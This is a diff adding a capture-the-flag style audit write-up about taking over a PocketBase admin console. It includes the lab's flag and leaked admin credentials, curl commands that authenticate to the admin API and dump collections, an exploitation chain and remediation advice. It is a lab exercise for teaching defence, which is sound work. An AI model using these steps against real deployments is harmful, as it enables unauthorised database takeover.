@@ -1,0 +1,129 @@
+# Breach 06 — Privilege Escalation via PocketBase Admin Console
+
+## Flag
+`FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}`
+
+## Severity
+CRITICAL
+
+## CWE
+CWE-798: Use of Hard-Coded Credentials
+CWE-284: Improper Access Control
+
+## OWASP
+A01:2021 – Broken Access Control / A05:2021 – Security Misconfiguration
+
+## What it is
+PocketBase ships with a web-based admin console at `/_/` that provides unrestricted
+read/write access to every collection and record in the database. On this platform,
+that console is bound to a network-reachable address (not localhost-only), protected
+only by a static admin password that was stored in the application's own config file
+at `/internal/config` — the same file made readable via the XXE/SSRF breach.
+
+The combination is a complete collapse of the backend's security boundary: leaked,
+static credentials + a reachable admin console = total database control that entirely
+bypasses the application's role model, authentication layer, and every other control
+documented in this audit. The `x-pocketbase` response header (present on every HTTP
+response from the app — see Information Disclosure via Headers finding) even advertises
+the backend's address to any observer:
+
+x-pocketbase: http://localhost:8090
+
+
+## How it works
+
+### Step 1: Credentials obtained via XXE/SSRF (Breach 05)
+
+Email: admin@42network.local
+Password: Darkly42Admin!
+
+These were returned in plaintext in the `/internal/config` response body that the
+XXE payload fetched and reflected into the imported agenda event.
+
+### Step 2: Authenticate to the PocketBase admin API
+```bash
+AUTH=$(curl -s -X POST http://localhost:8090/api/admins/auth-with-password \
+  -H "Content-Type: application/json" \
+  -d '{"identity":"admin@42network.local","password":"Darkly42Admin!"}')
+
+TOKEN=$(echo "$AUTH" | grep -oE '"token":"[^"]+' | cut -d'"' -f4)
+echo "Admin token: ${TOKEN:0:30}..."
+```
+PocketBase returns a long-lived admin JWT that grants unrestricted access to all
+collections and admin API endpoints.
+
+### Step 3: Enumerate collections and access internal_audit
+```bash
+# List all collections
+curl -s -H "Authorization: $TOKEN" \
+  http://localhost:8090/api/collections | grep -o '"name":"[^"]*"'
+
+# Read the internal_audit collection
+curl -s -H "Authorization: $TOKEN" \
+  http://localhost:8090/api/collections/internal_audit/records
+```
+
+### Step 4: Extract the flag
+The `internal_audit` collection contains records with the flag field:
+
+FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}
+
+
+### Via the browser UI
+Navigate to `http://localhost:8090/_/`, login with the leaked credentials,
+click Collections → internal_audit → view records. The flag is visible directly
+in the record data.
+
+## Flag Location
+- **Backend:** PocketBase admin console at `http://localhost:8090/_/`
+- **Collection:** `internal_audit`
+- **Access:** PocketBase admin API token (obtained with leaked credentials)
+
+## The Exploitation Chain
+This breach sits at the top of the audit's exploitation chain:
+
+Breach 01 (IDOR) → any user's email exposed
+↓
+Breach 02 (Password Reset) → account access for any email
+↓
+Breach 04 (Mass Assignment) → privilege escalation to god role
+↓
+Breach 05 (XXE/SSRF) → leaks PocketBase admin credentials
+↓
+Breach 06 (PocketBase Admin) → complete database compromise ✓
+
+
+## Impact
+- **Total database access**: every user record, grade, internal note, and
+  newsletter subscription is readable and writable with no application-layer
+  controls in the way — the admin API bypasses every role check the FastAPI
+  app enforces.
+- **Role model irrelevant**: even if every application-layer privilege escalation
+  path were patched, direct PocketBase admin access lets an attacker modify any
+  user's role, password hash, or session directly in the database.
+- **Persistent backdoor**: an attacker can create a new PocketBase admin account,
+  rotate the existing admin password to lock out the real admin, or plant data
+  in any collection — changes that persist regardless of what the application
+  layer does.
+- **Complete audit evasion**: PocketBase's own admin audit logging is disabled
+  by default; none of these actions leave any trace in the application's logs.
+
+## How it could have been avoided (remediation)
+- Bind the PocketBase process exclusively to the loopback interface so it is
+  unreachable from any network client, only from the application process running
+  on the same host:
+```bash
+pocketbase serve --http=127.0.0.1:8090
+```
+- Treat the PocketBase admin password as a high-value secret: generate it with
+  a cryptographically secure random source (32+ characters), store it only in a
+  secrets manager or an environment variable injected at deploy time, and never
+  write it to any file or endpoint reachable by the application itself.
+- Rotate the admin password immediately after any suspected compromise — and after
+  this audit, since the credential is now documented.
+- Never expose backend connectivity details (the `x-pocketbase` header) in HTTP
+  responses to clients; remove all internal-infrastructure headers at the reverse
+  proxy layer before responses leave the server.
+- Fix the root-cause breach (XXE/SSRF) so that `/internal/config` cannot be
+  fetched via the XML parser in the first place — the PocketBase credential breach
+  is entirely downstream of that one unpatched parser configuration.
